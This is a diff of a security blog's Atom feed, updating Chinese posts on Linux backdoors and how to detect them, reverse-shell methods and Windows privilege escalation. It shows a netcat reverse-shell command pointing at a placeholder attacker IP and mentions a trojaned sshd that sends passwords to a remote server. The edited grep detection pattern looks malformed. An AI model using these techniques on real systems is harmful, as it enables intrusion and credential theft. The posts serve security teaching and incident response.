@@ -72,7 +72,7 @@
     <link href="http://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/"/>
     <id>http://kevien.github.io/2019/02/16/linux常见backdoor及排查技术/</id>
     <published>2019-02-16T13:38:54.000Z</published>
-    <updated>2020-01-18T07:25:37.702Z</updated>
+    <updated>2020-02-10T03:00:02.253Z</updated>
     
     <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">原文已发布至先知平台</div><div class="line">linux常见backdoor及排查技术</div><div class="line">https://xz.aliyun.com/t/4090</div><div class="line">windows常见backdoor、权限维持方法及排查技术</div><div class="line">https://xz.aliyun.com/t/4842</div></pre></td></tr></table></figure>
 <h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><p><img src="/2019/02/16/linux常见backdoor及排查技术/backdooropen.jpg" alt=""></p>
@@ -139,7 +139,7 @@
 <li>另外一种就是通过在openssh源码中插入恶意代码重新编译并替换原有sshd文件。插入的恶意代码可以是将登录成功的用户密码发送到远程服务器或者记录到某个log文件中。</li>
 <li>优点：隐蔽性较好</li>
 <li>缺点：暂无</li>
-<li>排查：这种sshd后门一般可能会有一定的特征，可以通过strings sshd |grep ‘[1-9]{1,3}.[1-9]{1,3}.[1-9]{1,3}’或者通过strace 查看是否有可疑的写文件操作。</li>
+<li>排查：这种sshd后门一般可能会有一定的特征，可以通过strings sshd |egrep ‘\d{1,3}.\d{1,3}.‘或者通过strace 查看是否有可疑的写文件操作。</li>
 <li>此外还有一种给openssh打补丁的方式添加ssh后门的方法，具体见<a href="https://www.cnblogs.com/bigdevilking/p/9535427.html" target="_blank" rel="external">利用Openssh后门 劫持root密码</a><h3 id="定时任务和开机启动项"><a href="#定时任务和开机启动项" class="headerlink" title="定时任务和开机启动项"></a>定时任务和开机启动项</h3></li>
 <li>一般的挖矿木马喜欢设置定时任务来进行驻留或者进行分时段的挖矿。<br><img src="/2019/02/16/linux常见backdoor及排查技术/crontab.png" alt=""></li>
 <li>排查：一般通过crontab -l命令即可检测到定时任务后门。不同的linux发行版可能查看开机启动项的文件不大相同，Debian系linux系统一般是通过查看/etc/init.d目录有无最近修改和异常的开机启动项。而Redhat系的linux系统一般是查看/etc/rc.d/init.d或者/etc/systemd/system等目录。<br><img src="/2019/02/16/linux常见backdoor及排查技术/init.png" alt=""><h3 id="预加载型动态链接库后门-ld-so-preload"><a href="#预加载型动态链接库后门-ld-so-preload" class="headerlink" title="预加载型动态链接库后门 ld.so.preload"></a>预加载型动态链接库后门 ld.so.preload</h3></li>
@@ -655,13 +655,14 @@
     <link href="http://kevien.github.io/2018/01/30/reverse-shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
     <id>http://kevien.github.io/2018/01/30/reverse-shell的几种方式/</id>
     <published>2018-01-30T07:58:01.000Z</published>
-    <updated>2019-04-21T15:46:05.750Z</updated>
+    <updated>2020-02-08T09:12:20.696Z</updated>
     
     <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
 <li>这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的方法。</li>
 <li>linux有很多发行版，不同发行版中的内置工具、安全机制等都有所不同。</li>
 <li>下文中的几个例子在大多数的系统中是通用的。</li>
-<li>这里主要重点关注一下4和5<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
+<li>这里主要重点关注一下4和5</li>
+<li>20200208更新–更多反弹shell方式见<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="external">Reverse Shell Cheat Sheet</a><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
 <li>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2></li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T</div><div class="line">nc -n -vv -l -p &lt;port&gt;					# A</div></pre></td></tr></table></figure>
@@ -1159,13 +1160,14 @@
     <link href="http://kevien.github.io/2017/10/01/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(%E4%BA%8C)/"/>
     <id>http://kevien.github.io/2017/10/01/windows权限提升(二)/</id>
     <published>2017-10-01T03:39:24.000Z</published>
-    <updated>2020-01-04T09:18:23.553Z</updated>
+    <updated>2020-02-08T14:25:25.507Z</updated>
     
     <content type="html"><![CDATA[<p><img src="/2017/10/01/windows权限提升(二)/windowsprivilegeescalation.png" alt=""></p>
 <h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
 <li>A privilege is the right of an account, such as a user or group account, to perform various system-related operations on the local computer, such as shutting down the system, loading device drivers, or changing the system time” (msdn.microsoft.com)</li>
 <li>首先来说说windows权限提升对于攻击者来说有哪些好处<br>1.可以尝试更多的攻击手法<br>2.可以获取到本地用户的哈希<br>3.可以在网络层进行LLMNR、NBNS投毒等<br>4.本地抓包<br>5.安装软件<br>6.可以从内存中获取明文的认证信息</li>
-<li>当然本篇文章只是有关单台windows的提权，提权有时还包含内环境的情况，就是从一个普通域用户提权到域管理员用户，这种情况暂不在本文讨论范畴。<h2 id="基本系统信息枚举"><a href="#基本系统信息枚举" class="headerlink" title="基本系统信息枚举"></a>基本系统信息枚举</h2></li>
+<li>当然本篇文章只是有关单台windows的提权，提权有时还包含内环境的情况，就是从一个普通域用户提权到域管理员用户，这种情况暂不在本文讨论范畴。</li>
+<li>20200208更新-发现好笔记一处,比我的文章全。。。<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank" rel="external">Windows - Privilege Escalation</a><h2 id="基本系统信息枚举"><a href="#基本系统信息枚举" class="headerlink" title="基本系统信息枚举"></a>基本系统信息枚举</h2></li>
 <li>在提权之前我们首先需要对这个系统需要有一定的了解，比如需要知道当前用户有哪些权限、系统打了哪些补丁等信息。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"># Basics</div><div class="line">systeminfo</div><div class="line">hostname</div><div class="line"></div><div class="line"># Who am I?</div><div class="line">whoami</div><div class="line">echo %username%</div><div class="line"></div><div class="line"># What users/localgroups are on the machine?</div><div class="line">net users</div><div class="line">net localgroups</div><div class="line"></div><div class="line"># More info about a specific user. Check if user has privileges.</div><div class="line">net user user1</div><div class="line"></div><div class="line"># View Domain Groups</div><div class="line">net group /domain</div><div class="line"></div><div class="line"># View Members of Domain Group</div><div class="line">net group /domain &lt;Group Name&gt;</div><div class="line"></div><div class="line"># Firewall</div><div class="line">netsh firewall show state</div><div class="line">netsh firewall show config</div><div class="line"></div><div class="line"># Network</div><div class="line">ipconfig /all</div><div class="line">route print</div><div class="line">arp -A</div><div class="line"></div><div class="line"># How well patched is the system?</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot; - to find specific KBs</div></pre></td></tr></table></figure>
 </li>
 </ul>
